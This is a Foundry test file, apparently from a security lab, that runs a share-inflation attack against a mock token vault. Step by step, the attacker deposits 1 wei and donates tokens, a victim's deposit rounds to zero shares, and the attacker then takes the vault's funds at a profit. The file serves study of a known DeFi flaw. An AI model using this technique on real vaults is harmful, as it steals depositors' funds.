// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {MockERC20} from "../src/MockERC20.sol";
import {InflationVault} from "../src/InflationVault.sol";
import {InflationAttack} from "../src/attacks/InflationAttack.sol";

contract InflationVaultTest is Test {
    MockERC20 token;
    InflationVault vault;
    InflationAttack attack;
    address victim = makeAddr("victim");

    function setUp() public {
        token = new MockERC20();
        vault = new InflationVault(address(token));
        attack = new InflationAttack(address(vault), address(token));
        
        // Fund attack with 1000e18 + 1 tokens (1 wei deposit + 1000e18 donation)
        token.mint(address(attack), 1000e18 + 1);
        // Fund victim with 1000e18 tokens
        token.mint(victim, 1000e18);
    }

    function test_inflation_attack() public {
        // 1. Attacker deposits 1 wei + donates 1000e18
        vm.prank(address(attack));
        attack.pwn();
        
        // 2. Victim deposits 1000e18 → gets 0 shares (rounds down)
        vm.prank(victim);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1000e18);
        
        // 3. Attacker redeems inflated shares
        vm.prank(address(attack));
        attack.take();
        
        // Victim should have 0 shares (lost all value)
        assertEq(vault.shares(victim), 0, "Victim has shares");
        // Vault should be empty
        assertEq(token.balanceOf(address(vault)), 0, "Vault not empty");
        // Attacker should have profit (got ~2000e18 tokens for 1000e18+1 spent)
        assertGt(token.balanceOf(address(attack)), 1000e18, "No profit");
    }
}